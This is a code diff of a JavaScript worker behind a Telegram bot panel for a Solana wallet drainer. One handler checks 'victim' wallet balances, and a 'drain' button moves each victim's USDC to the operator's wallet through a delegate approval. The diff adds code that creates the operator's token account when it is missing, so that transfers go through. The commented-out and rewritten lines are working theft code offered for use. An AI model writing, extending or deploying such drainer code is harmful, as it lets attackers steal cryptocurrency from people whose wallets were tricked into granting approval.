@@ -1,8 +1,8 @@
 import { Buffer } from 'buffer';
 globalThis.Buffer = Buffer;
 
-import { Connection, PublicKey, Keypair, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
-import { createTransferInstruction, getAssociatedTokenAddress } from "@solana/spl-token";
+import { Connection, PublicKey, Keypair, Transaction, sendAndConfirmTransaction, SystemProgram } from "@solana/web3.js";
+import { createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction } from "@solana/spl-token";
 import bs58 from "bs58";
 
 export default {
@@ -28,7 +28,6 @@ export default {
           const data = update.callback_query.data;
           const chatId = update.callback_query.message.chat.id;
 
-          // 1. STATS
           if (data === "refresh_stats") {
             let messageText = "📊 *DEXSCREENR PANEL*\n\n";
             if (env.HARVEST) {
@@ -49,13 +48,10 @@ export default {
             });
           }
 
-          // 2. CHECK BALANCE BUTTON
           if (data.startsWith("balance:")) {
             const victimAddress = data.split(":")[1];
-            // RPC GEAENDERT
             const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
             const victimPubkey = new PublicKey(victimAddress);
-            
             const solBalance = await connection.getBalance(victimPubkey);
             const solAmount = (solBalance / 1e9).toFixed(4);
 
@@ -65,7 +61,6 @@ export default {
             });
           }
 
-          // 3. DRAIN BUTTON
           if (data.startsWith("drain:")) {
             const victimAddress = data.split(":")[1];
             
@@ -75,7 +70,7 @@ export default {
             });
 
             try {
-              // RPC GEAENDERT
+              // Wir nutzen einen starken RPC für den Worker
               const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
               const privateKeyArray = bs58.decode(env.PRIVATE_KEY);
               const payer = Keypair.fromSecretKey(privateKeyArray);
@@ -94,11 +89,26 @@ export default {
                 throw new Error("Victim has 0 USDC to drain.");
               }
 
-              const tx = new Transaction().add(
+              // Prüfen, ob DEINE Wallet ein USDC Konto hat, wenn nicht, erstellen
+              const tx = new Transaction();
+              const myAtaInfo = await connection.getAccountInfo(myAta);
+              if (myAtaInfo === null) {
+                tx.add(
+                  createAssociatedTokenAccountInstruction(
+                    payer.publicKey, // Payer
+                    myAta,           // Associated Token Address
+                    payer.publicKey, // Owner
+                    USDC_MINT        // Mint
+                  )
+                );
+              }
+
+              // Transfer Instruction hinzufügen
+              tx.add(
                 createTransferInstruction(
                   victimAta,
                   myAta,
-                  payer.publicKey,
+                  payer.publicKey, // Der Delegate (du)
                   [],
                   parseInt(amountToDrain)
                 )
